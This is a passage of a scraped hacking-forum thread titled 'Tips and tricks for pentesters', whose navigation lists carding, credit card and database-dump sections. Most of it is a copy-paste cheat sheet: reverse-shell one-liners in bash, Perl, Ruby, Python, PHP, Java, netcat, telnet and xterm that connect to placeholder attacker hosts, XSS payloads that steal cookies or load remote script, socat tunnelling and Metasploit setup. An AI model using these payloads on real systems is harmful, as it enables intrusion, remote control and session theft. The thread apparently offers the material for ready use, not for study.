print /d $eax<br />$17 = 13<br />(gdb) print /t $eax<br />$18 = 1101<br />(gdb) print /x $eax<br />$19 = 0xd<br />(gdb)<br /><br /># Display values of specific memory locations<br />command : x/nyz (Examine)<br />n –&gt; Number of fields to display ==&gt;<br />y –&gt; Format for output ==&gt; c (character) , d (decimal) , x (Hexadecimal)<br />z –&gt; Size of field to be displayed ==&gt; b (byte) , h (halfword), w (word 32 Bit)</code></div><br /><br />BASH Reverse Shell<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>bash -i &gt;&amp; /dev/tcp/X.X.X.X/443 0&gt;&amp;1<br /><br />exec /bin/bash 0&amp;0 2&gt;&amp;0<br />exec /bin/bash 0&amp;0 2&gt;&amp;0<br /><br />0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196<br /><br />0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196<br /><br />exec 5&lt;&gt;/dev/tcp/attackerip/4444 cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or: while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done<br />exec 5&lt;&gt;/dev/tcp/attackerip/4444<br /><br />cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or:<br />while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done<br /><br />/bin/bash -i &gt; /dev/tcp/attackerip/8080 0&lt;&amp;1 2&gt;&amp;1<br />/bin/bash -i &gt; /dev/tcp/X.X.X.X/443 0&lt;&amp;1 2&gt;&amp;1</code></div><br /><br />PERL Reverse Shell<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:443&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'<br /><br /># for win platform<br />perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'<br />perl -e 'use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};’</code></div><br /><br />RUBY Reverse Shell<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>ruby -rsocket -e 'exit if fork;c=TCPSocket.new(&quot;attackerip&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end'<br /><br /># for win platform<br />ruby -rsocket -e 'c=TCPSocket.new(&quot;attackerip&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end'<br />ruby -rsocket -e 'f=TCPSocket.open(&quot;attackerip&quot;,&quot;443&quot;).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)'</code></div><br /><br />PYTHON Reverse Shell<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;attackerip&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(&#91;&quot;/bin/sh&quot;,&quot;-i&quot;&#93;);'</code></div><br /><br />PHP Reverse Shell<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>php -r '$sock=fsockopen(&quot;attackerip&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'</code></div><br /><br />JAVA Reverse Shell<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>r = Runtime.getRuntime()<br />p = r.exec(&#91;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/attackerip/443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#93; as String&#91;&#93;)<br />p.waitFor()</code></div><br /><br />NETCAT Reverse Shell<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>nc -e /bin/sh attackerip 4444<br />nc -e /bin/sh 192.168.37.10 443<br /><br /># If the -e option is disabled, try this<br /># mknod backpipe p &amp;&amp; nc attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe<br />/bin/sh | nc attackerip 443<br />rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4443 0/tmp/<br /><br /># If you have the wrong version of netcat installed, try<br />rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip &gt;/tmp/f</code></div><br /><br />TELNET Reverse Shell<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code># If netcat is not available or /dev/tcp<br />mknod backpipe p &amp;&amp; telnet attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe</code></div><br /><br />XTERM Reverse Shell<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code># Start an open X Server on your system (:1 – which listens on TCP port 6001)<br />apt-get install xnest<br />Xnest :1<br /><br /># Then remember to authorise on your system the target IP to connect to you<br />xterm -display 127.0.0.1:1<br /><br /># Run this INSIDE the spawned xterm on the open X Server<br />xhost +targetip<br /><br /># Then on the target connect back to the your X Server<br />xterm -display attackerip:1<br />/usr/openwin/bin/xterm -display attackerip:1<br />or<br />$ DISPLAY=attackerip:0 xterm</code></div><br /><br />XSS Cheat Codes<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet<br />(&quot;&lt; iframes &gt; src=http://IP:PORT &lt;/ iframes &gt;&quot;)<br /><br />&lt;script&gt;document.location=http://IP:PORT&lt;/script&gt;<br /><br />';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//–&gt;&lt;/SCRIPT&gt;&quot;&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;<br /><br />&quot;;!–&quot;&lt;XSS&gt;=&amp;amp;amp;{()}<br /><br />&lt;IMG SRC=&quot;javascript&#058;alert('XSS');&quot;&gt;<br />&lt;IMG SRC=javascript&#058;alert('XSS')&gt;<br />&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&quot;&gt;<br />&lt;IMG SRC=&amp;amp;amp;#106;&amp;amp;amp;#97;&amp;amp;amp;#118;&amp;amp;amp;#97;&amp;amp;amp;#115;&amp;amp;amp;#99;&amp;amp;amp;#114;&amp;amp;amp;#105;&amp;amp;amp;#112;&amp;amp;amp;#116;&amp;amp;amp;#58;&amp;amp;amp;#97;&amp;amp;amp;#108;&amp;amp;amp;#101;&amp;amp;amp;#114;&amp;amp;amp;#116;&amp;amp;amp;#40;&amp;amp;amp;#39;&amp;amp;amp;#88;&amp;amp;amp;#83;&amp;amp;amp;#83;&amp;amp;amp;#39;&amp;amp;amp;#41;&gt;<br /><br />&lt;IMG SRC=&amp;amp;amp;#0000106&amp;amp;amp;#0000097&amp;amp;amp;#0000118&amp;amp;amp;#0000097&amp;amp;amp;#0000115&amp;amp;amp;#0000099&amp;amp;amp;#0000114&amp;amp;amp;#0000105&amp;amp;amp;#0000112&amp;amp;amp;#0000116&amp;amp;amp;#0000058&amp;amp;amp;#0000097&amp;amp;amp;#0000108&amp;amp;amp;#0000101&amp;amp;amp;#0000114&amp;amp;amp;#0000116&amp;amp;amp;#0000040&amp;amp;amp;#0000039&amp;amp;amp;#0000088&amp;amp;amp;#0000083&amp;amp;amp;#0000083&amp;amp;amp;#0000039&amp;amp;amp;#0000041&gt;<br />&lt;IMG SRC=&quot;jav ascript&#058;alert('XSS');&quot;&gt;<br /><br />perl -e 'print &quot;&lt;IMG SRC=javascript&#058;alert(\&quot;XSS\&quot;)&gt;&quot;;' &gt; out<br /><br />&lt;BODY onload!#$%&amp;amp;()*~+-_.,:;?@&#91;/|\&#93;^`=alert(&quot;XSS&quot;)&gt;<br /><br />(&quot;&gt;&lt; iframes http://google.com &lt; iframes &gt;)<br /><br />&lt;BODY BACKGROUND=&quot;javascript&#058;alert('XSS')&quot;&gt;<br />&lt;FRAMESET&gt;&lt;FRAME SRC=”javascript&#058;alert('XSS');&quot;&gt;&lt;/FRAMESET&gt;<br />&quot;&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;<br />%253cscript%253ealert(document.cookie)%253c/script%253e<br />&quot;&gt;&lt;s&quot;%2b&quot;cript&gt;alert(document.cookie)&lt;/script&gt;<br />%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)'%3E<br />&lt;img src=asdf onerror=alert(document.cookie)&gt;</code></div><br /><br />SSH Over SCTP (With Socat)<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code># on remote server<br /># assuming you want the SCTP socket to listen on port 80/SCTP and sshd is on 22/TCP<br />$ socat SCTP-LISTEN:80,fork TCP:localhost:22<br /><br /># localhost<br /># replace SERVER_IP with IP of listening server, and 80 with whatever port the SCTP listener is on :)<br />$ socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80<br /><br /># create socks proxy<br /># replace username and -p port value as needed...<br />$ ssh -lusername localhost -D 8080 -p 1337</code></div><br /><br />Install Metasploit Community Edition in Kali 2.0<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code># github urls<br />https://github.com/rapid7/metasploit-framework/wiki/Downloads-by-Version<br /><br />wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run &amp;&amp; chmod<br />+x metasploit-latest-linux-x64-installer.run &amp;&amp; ./metasploit-latest-linux-x64-installer.run<br /><br /># create user<br />$ /opt/metasploit/createuser<br />&#91;*&#93; Please enter a username: root<br />&#91;*&#93; Creating user 'root' with password 'LsRRV&#91;I^5' ...<br /><br /># activate your metasploit license<br />https://localhost:3790<br /><br /># update metasploite<br />$ /opt/metasploit/app/msfupdate<br /><br /># use msfconsole<br />$ /opt/metasploit/app/msfconsole</code></div></div>
+
+			
+									
+									
+						</div>
+
+		</div>
+
+				<div class="back2top"><a href="#top" class="top" title="Top">Top</a></div>
+		
+		</div>
+	</div>
+
+	<hr class="divider" />
+				<div id="p1477" class="post has-profile bg1">
+		<div class="inner">
+
+		<dl class="postprofile" id="profile1477">
+			<dt class="no-profile-rank has-avatar">
+				<div class="avatar-container">
+																<a href="./memberlist.php?mode=viewprofile&amp;u=972" class="avatar"><img class="avatar" src="./download/file.php?avatar=g2_1481306455.png" width="120" height="100" alt="User avatar" /></a>														</div>
+								<a href="./memberlist.php?mode=viewprofile&amp;u=972" style="color: #00BF00;" class="username-coloured">KissOfDeath</a>							</dt>
+
+									
+		<dd class="profile-posts"><strong>Posts:</strong> <a href="./search.php?author_id=972&amp;sr=posts">5</a></dd>		<dd class="profile-joined"><strong>Joined:</strong> Fri Aug 03, 2018 9:11 am</dd>		
+		
+						
+						
+		</dl>
+
+		<div class="postbody">
+						<div id="post_content1477">
+
+						<h3 ><a href="#p1477">Re: Tips and tricks for pentesters (Part 1)</a></h3>
+
+													<ul class="post-buttons">
+																																									<li>
+							<a href="./posting.php?mode=quote&amp;f=43&amp;p=1477" title="Reply with quote" class="button icon-button quote-icon"><span>Quote</span></a>
+						</li>
+														</ul>
+							
+						<p class="author"><a href="./viewtopic.php?p=1477#p1477"><span class="imageset icon_post_target" title="Post">Post</span></a><span class="responsive-hide">by <strong><a href="./memberlist.php?mode=viewprofile&amp;u=972" style="color: #00BF00;" class="username-coloured">KissOfDeath</a></strong> &raquo; </span>Wed Aug 22, 2018 6:41 am </p>
+			
+			
+			
+			<div class="content">Gr8 tips <br />Thx</div>
+
+			
+									
+									
+						</div>
+
+		</div>
+
+				<div class="back2top"><a href="#top" class="top" title="Top">Top</a></div>
+		
+		</div>
+	</div>
+
+	<hr class="divider" />
+	
+
+	<form id="viewtopic" method="post" action="./viewtopic.php?f=43&amp;t=634">
+	<fieldset class="display-options" style="margin-top: 0; ">
+				<label>Display posts from previous: <select name="st" id="st"><option value="0" selected="selected">All posts</option><option value="1">1 day</option><option value="7">7 days</option><option value="14">2 weeks</option><option value="30">1 month</option><option value="90">3 months</option><option value="180">6 months</option><option value="365">1 year</option></select></label>
+		<label>Sort by <select name="sk" id="sk"><option value="a">Author</option><option value="t" selected="selected">Post time</option><option value="s">Subject</option></select></label> <label><select name="sd" id="sd"><option value="a" selected="selected">Ascending</option><option value="d">Descending</option></select></label>
+		<input type="submit" name="sort" value="Go" class="button2" />
+			</fieldset>
+	</form>
+	<hr />
+
+<div class="action-bar bottom">
+	<div class="buttons">
+		
+			<a href="./posting.php?mode=reply&amp;f=43&amp;t=634" class="button icon-button reply-icon" title="Post a reply">
+			Post Reply		</a>
+	
+			</div>
+
+		<div class="dropdown-container dropdown-button-control topic-tools">
+		<span title="Topic tools" class="button icon-button tools-icon dropdown-trigger dropdown-select"></span>
+		<div class="dropdown hidden">
+			<div class="pointer"><div class="pointer-inner"></div></div>
+			<ul class="dropdown-contents">
+																								<li class="small-icon icon-print"><a href="./viewtopic.php?f=43&amp;t=634&amp;view=print" title="Print view" accesskey="p">Print view</a></li>							</ul>
+		</div>
+	</div>
+
+		
+	
+			<div class="pagination">
+			2 posts
+							&bull; Page <strong>1</strong> of <strong>1</strong>
+					</div>
+		<div class="clear"></div>
+</div>
+
+
+	<p class="jumpbox-return"><a href="./viewforum.php?f=43" class="left-box arrow-left" accesskey="r">Return to “Penetration Tests”</a></p>
+
+
+	<div class="dropdown-container dropdown-container-right dropdown-up dropdown-left dropdown-button-control" id="jumpbox">
+		<span title="Jump to" class="dropdown-trigger button dropdown-select">
+			Jump to		</span>
+		<div class="dropdown hidden">
+			<div class="pointer"><div class="pointer-inner"></div></div>
+			<ul class="dropdown-contents">
+																			<li><a href="./viewforum.php?f=9">Home</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=10">Announcements</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=11">Comments &amp; FeedBack</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=12">Staff Applications</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=13">Technical Support</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=14">Infractions and reporting</a></li>
+																<li><a href="./viewforum.php?f=15">Community</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=16">General Discussion</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=17">Hello World!</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=18">International - No English</a></li>
+																<li><a href="./viewforum.php?f=19">Anonymity</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=20">Discussions about anonymity</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=21">Socks Proxy</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=22">HTTP / HTTPS Proxy</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=23">Proxy Programs / VPN</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=52">RDP / VPS / SERVERS</a></li>
+																<li><a href="./viewforum.php?f=42">Hackers Zone</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=43">Penetration Tests</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=44">Social Engineering Tests</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=45">Exploits</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=46">Tools</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=47">Malware</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=48">Cryptography</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=49">Others</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=50">Hacking Tutorials</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=30">Hacked Accounts and Database Dumps</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=53">Android Moded apk</a></li>
+																<li><a href="./viewforum.php?f=24">Carding Zone</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=25">Carders Home</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=26">Public Carding Tutorials</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=27">Carding Tools</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=28">Carding Proof / Showoff</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=29">Cardable Websites</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=51">Credit Cards</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=31">Help Me</a></li>
+																<li><a href="./viewforum.php?f=32">Market</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=33">I Buy</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=34">I Sell Verified Carders</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=35">I Sell Open Source</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=36">Exchange</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=37">I Service</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=38">Best Carding World Escrow Service</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=39">Scam Reports</a></li>
+										</ul>
+		</div>
+	</div>
+
+
+
+			</div>
+
+
+<div id="page-footer" role="contentinfo">
+	<div class="navbar" role="navigation">
+	<div class="inner">
+
+	<ul id="nav-footer" class="linklist bulletin" role="menubar">
+		<li class="small-icon icon-home breadcrumbs">
+									<span class="crumb"><a href="./index.php" data-navbar-reference="index">Home</a></span>
+					</li>
+		
+				<li class="rightside">All times are <abbr title="UTC">UTC</abbr></li>
+							<li class="small-icon icon-delete-cookies rightside"><a href="./ucp.php?mode=delete_cookies" data-ajax="true" data-refresh="true" role="menuitem">Delete all board cookies</a></li>
+									<li class="small-icon icon-team rightside" data-last-responsive="true"><a href="./memberlist.php?mode=team" role="menuitem">The team</a></li>					</ul>
+
+	</div>
+</div>
+
+	<div class="copyright">
+				Powered by <a href="https://www.phpbb.com/">phpBB</a>&reg; Forum Software &copy; phpBB Limited
+									</div>
+
+	<div id="darkenwrapper" data-ajax-error-title="AJAX error" data-ajax-error-text="Something went wrong when processing your request." data-ajax-error-text-abort="User aborted request." data-ajax-error-text-timeout="Your request timed out; please try again." data-ajax-error-text-parsererror="Something went wrong with the request and the server returned an invalid reply.">
+		<div id="darken">&nbsp;</div>
+	</div>
+
+	<div id="phpbb_alert" class="phpbb_alert" data-l-err="Error" data-l-timeout-processing-req="Request timed out.">
+		<a href="#" class="alert_close"></a>
+		<h3 class="alert_title">&nbsp;</h3><p class="alert_text"></p>
+	</div>
+	<div id="phpbb_confirm" class="phpbb_alert">
+		<a href="#" class="alert_close"></a>
+		<div class="alert_text"></div>
+	</div>
+</div>
+
+</div>
+
+<div>
+	<a id="bottom" class="anchor" accesskey="z"></a>
+	</div>
+
+<script type="text/javascript" src="./assets/javascript/jquery.min.js?assets_version=6"></script>
+<script type="text/javascript" src="./assets/javascript/core.js?assets_version=6"></script>
+
+
+<script type="text/javascript" src="./styles/prosilver/template/forum_fn.js?assets_version=6"></script>
+
+<script type="text/javascript" src="./styles/prosilver/template/ajax.js?assets_version=6"></script>
+
+
+
+
+</body>
+</html>
